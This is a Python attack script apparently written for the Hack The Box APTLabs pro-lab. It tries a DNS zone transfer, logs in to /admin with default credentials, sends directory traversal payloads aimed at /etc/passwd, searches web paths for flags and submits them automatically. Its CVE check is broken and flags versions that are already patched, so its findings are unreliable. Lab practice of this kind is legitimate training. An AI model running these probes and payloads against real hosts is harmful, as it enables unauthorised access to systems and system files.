#!/usr/bin/env python3
"""
Vulnerability analysis against APTLabs hosts
Focus on PowerDNS (port 53) and Radicale/PowerGSLB (port 443)
"""

import asyncio
import sys
import os
import subprocess
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

sys.path.append(os.path.join(os.path.dirname(__file__), 'agents'))

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else None

if not TARGET_HOST:
    print("Usage: python run_vuln_analysis.py <target_host>")
    print("Example: python run_vuln_analysis.py 10.10.110.13")
    sys.exit(1)
DISCOVERED_SERVICES = {
    53: {
        "service": "PowerDNS Authoritative Server 4.1.11",
        "type": "dns",
        "nsid": "powergslb",
        "version": "4.1.11"
    },
    443: {
        "service": "Radicale calendar and contacts server",
        "type": "web",
        "server": "PowerGSLB/1.7.3 Python/2.7.5",
        "ssl_cert": "localhost.localdomain"
    }
}

async def analyze_powerdns_vulnerabilities():
    """Analyze PowerDNS 4.1.11 for known vulnerabilities."""
    print(f"\n🔍 Analyzing PowerDNS 4.1.11 vulnerabilities")
    
    vulnerabilities = []
    
    known_vulns = [
        {
            "cve": "CVE-2019-10203",
            "description": "PowerDNS Authoritative Server 4.1.x before 4.1.10 allows packet cache pollution via crafted query",
            "severity": "Medium",
            "exploitable": "Potentially"
        },
        {
            "cve": "CVE-2019-10162",
            "description": "PowerDNS Authoritative Server 4.1.x before 4.1.9 allows remote attackers to cause DoS",
            "severity": "High", 
            "exploitable": "Yes"
        }
    ]
    
    print(f"✅ PowerDNS version 4.1.11 analysis:")
    for vuln in known_vulns:
        if "4.1.11" >= vuln.get("affected_version", "4.1.0"):
            vulnerabilities.append(vuln)
            print(f"  🚨 {vuln['cve']}: {vuln['description']}")
            print(f"     Severity: {vuln['severity']}, Exploitable: {vuln['exploitable']}")
    
    print(f"\n🔍 Testing DNS zone transfer...")
    try:
        result = subprocess.run([
            "dig", f"@{TARGET_HOST}", "AXFR", "aptlabs.htb"
        ], capture_output=True, text=True, timeout=10)
        
        if "Transfer failed" not in result.stdout and len(result.stdout) > 100:
            vulnerabilities.append({
                "type": "DNS Zone Transfer",
                "description": "DNS server allows zone transfer",
                "severity": "Medium",
                "exploitable": "Yes"
            })
            print(f"  🚨 DNS Zone Transfer allowed!")
        else:
            print(f"  ✅ DNS Zone Transfer denied")
    except Exception as e:
        print(f"  ❌ DNS Zone Transfer test failed: {e}")
    
    return vulnerabilities

async def analyze_radicale_vulnerabilities():
    """Analyze Radicale calendar server and PowerGSLB for vulnerabilities."""
    print(f"\n🔍 Analyzing Radicale/PowerGSLB vulnerabilities")
    
    vulnerabilities = []
    
    base_url = f"https://{TARGET_HOST}"
    
    print(f"🔍 Testing authentication bypass on /admin")
    auth_bypass_payloads = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", ""),
        ("", ""),
        ("root", "root"),
        ("administrator", "administrator")
    ]
    
    for username, password in auth_bypass_payloads:
        try:
            response = requests.get(
                f"{base_url}/admin",
                auth=(username, password),
                verify=False,
                timeout=5
            )
            if response.status_code == 200:
                vulnerabilities.append({
                    "type": "Weak Authentication",
                    "description": f"Admin interface accessible with {username}:{password}",
                    "severity": "Critical",
                    "exploitable": "Yes",
                    "credentials": f"{username}:{password}"
                })
                print(f"  🚨 Authentication bypass found: {username}:{password}")
                break
            elif response.status_code != 401:
                print(f"  ⚠️  Unexpected response for {username}:{password}: {response.status_code}")
        except Exception as e:
            print(f"  ❌ Auth test failed for {username}:{password}: {e}")
    
    print(f"🔍 Testing directory traversal")
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd"
    ]
    
    for payload in traversal_payloads:
        try:
            response = requests.get(
                f"{base_url}/{payload}",
                verify=False,
                timeout=5
            )
            if "root:" in response.text or "Administrator" in response.text:
                vulnerabilities.append({
                    "type": "Directory Traversal",
                    "description": f"Directory traversal possible with payload: {payload}",
                    "severity": "High",
                    "exploitable": "Yes"
                })
                print(f"  🚨 Directory traversal found: {payload}")
                break
        except Exception as e:
            continue
    
    print(f"🔍 Testing CalDAV endpoints")
    caldav_paths = [
        "/.well-known/caldav",
        "/caldav",
        "/calendar",
        "/dav",
        "/radicale"
    ]
    
    for path in caldav_paths:
        try:
            response = requests.get(
                f"{base_url}{path}",
                verify=False,
                timeout=5
            )
            if response.status_code == 200:
                print(f"  ✅ Found CalDAV endpoint: {path}")
                if "HTB{" in response.text:
                    vulnerabilities.append({
                        "type": "Information Disclosure",
                        "description": f"Flag found in CalDAV endpoint {path}",
                        "severity": "Critical",
                        "exploitable": "Yes",
                        "flag_location": path
                    })
                    print(f"  🚩 FLAG FOUND in {path}!")
        except Exception as e:
            continue
    
    print(f"🔍 Testing PowerGSLB specific endpoints")
    gslb_paths = [
        "/status",
        "/health",
        "/config",
        "/api",
        "/metrics"
    ]
    
    for path in gslb_paths:
        try:
            response = requests.get(
                f"{base_url}{path}",
                verify=False,
                timeout=5
            )
            if response.status_code == 200 and len(response.text) > 50:
                print(f"  ✅ Found PowerGSLB endpoint: {path}")
                if "HTB{" in response.text:
                    vulnerabilities.append({
                        "type": "Information Disclosure",
                        "description": f"Flag found in PowerGSLB endpoint {path}",
                        "severity": "Critical",
                        "exploitable": "Yes",
                        "flag_location": path
                    })
                    print(f"  🚩 FLAG FOUND in {path}!")
        except Exception as e:
            continue
    
    return vulnerabilities

async def check_for_flags_in_responses():
    """Check common paths for HTB flags."""
    print(f"\n🚩 Searching for HTB flags in web responses")
    
    flag_paths = [
        "/",
        "/index.html",
        "/flag.txt",
        "/user.txt",
        "/root.txt",
        "/flag",
        "/robots.txt",
        "/.htaccess",
        "/backup",
        "/admin/flag.txt"
    ]
    
    flags_found = []
    base_url = f"https://{TARGET_HOST}"
    
    for path in flag_paths:
        try:
            response = requests.get(
                f"{base_url}{path}",
                verify=False,
                timeout=5
            )
            
            import re
            flag_pattern = r'HTB\{[^}]+\}'
            flags = re.findall(flag_pattern, response.text)
            
            if flags:
                for flag in flags:
                    flags_found.append({
                        "flag": flag,
                        "location": path,
                        "method": "web_enumeration"
                    })
                    print(f"  🚩 FLAG FOUND: {flag} at {path}")
            
        except Exception as e:
            continue
    
    return flags_found

async def main():
    """Run comprehensive vulnerability analysis."""
    print(f"🎯 APTLabs Vulnerability Analysis")
    print(f"Target: {TARGET_HOST}")
    print(f"Services: PowerDNS 4.1.11 (port 53), Radicale/PowerGSLB (port 443)")
    print("=" * 60)
    
    all_vulnerabilities = []
    flags_found = []
    
    dns_vulns = await analyze_powerdns_vulnerabilities()
    all_vulnerabilities.extend(dns_vulns)
    
    web_vulns = await analyze_radicale_vulnerabilities()
    all_vulnerabilities.extend(web_vulns)
    
    flags = await check_for_flags_in_responses()
    flags_found.extend(flags)
    
    print(f"\n{'='*60}")
    print("🏁 VULNERABILITY ANALYSIS SUMMARY")
    print(f"{'='*60}")
    print(f"Target: {TARGET_HOST}")
    print(f"Total vulnerabilities found: {len(all_vulnerabilities)}")
    print(f"Flags discovered: {len(flags_found)}")
    
    if all_vulnerabilities:
        print(f"\n🚨 VULNERABILITIES DISCOVERED:")
        for i, vuln in enumerate(all_vulnerabilities, 1):
            print(f"  {i}. {vuln.get('type', vuln.get('cve', 'Unknown'))}")
            print(f"     Description: {vuln.get('description', 'N/A')}")
            print(f"     Severity: {vuln.get('severity', 'Unknown')}")
            print(f"     Exploitable: {vuln.get('exploitable', 'Unknown')}")
            if 'credentials' in vuln:
                print(f"     Credentials: {vuln['credentials']}")
            print()
    
    if flags_found:
        print(f"\n🚩 FLAGS DISCOVERED:")
        for flag_info in flags_found:
            print(f"  Flag: {flag_info['flag']}")
            print(f"  Location: {flag_info['location']}")
            print(f"  Method: {flag_info['method']}")
            
            await submit_flag(flag_info['flag'])
    
    return all_vulnerabilities, flags_found

async def submit_flag(flag):
    """Submit discovered flag to HTB."""
    print(f"\n🚩 Submitting flag: {flag}")
    
    try:
        result = subprocess.run([
            "htb-operator", "prolabs", "submit",
            "--name", "APTLabs",
            "--flag", flag
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            print(f"✅ Flag submitted successfully!")
            print(f"Response: {result.stdout.strip()}")
            return True
        else:
            print(f"❌ Flag submission failed: {result.stderr.strip()}")
            return False
            
    except Exception as e:
        print(f"❌ Flag submission error: {e}")
        return False

if __name__ == "__main__":
    asyncio.run(main())
